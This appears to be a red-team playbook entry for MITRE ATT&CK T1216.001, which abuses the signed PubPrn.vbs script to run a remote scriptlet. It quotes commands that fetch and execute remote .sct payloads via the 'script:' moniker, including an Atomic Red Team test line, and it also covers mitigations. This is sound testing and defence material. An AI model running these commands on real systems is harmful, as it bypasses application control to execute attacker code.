---
name: "T1216.001_pubprn"
description: "Adversaries may use PubPrn to proxy execution of malicious remote files."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1216.001
  - defense-evasion
  - windows
  - sub-technique
technique_id: "T1216.001"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1216/001"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1216
  - T1216.002
prerequisites:
  - T1216
severity_boost:
  T1216: "Chain with T1216 for deeper attack path"
  T1216.002: "Chain with T1216.002 for deeper attack path"
---

# T1216.001 PubPrn

> **Sub-technique of:** T1216

## High-Level Description

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if PubPrn technique is applicable to target environment
- [ ] Check Windows systems for indicators of PubPrn
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: PubPrn.vbs Signed Script Bypass

Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.

**Supported Platforms:** windows

```cmd
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to PubPrn by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1216.001 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.

### M1040 Behavior Prevention on Endpoint
On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.


## Detection

### Detecting Remote Script Proxy Execution via PubPrn.vbs


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| PubPrn technique applicable | Medium | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [pubprn](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)
- [Enigma0x3 PubPrn Bypass](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)
- [Atomic Red Team - T1216.001](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1216.001)
- [MITRE ATT&CK - T1216.001](https://attack.mitre.org/techniques/T1216/001)
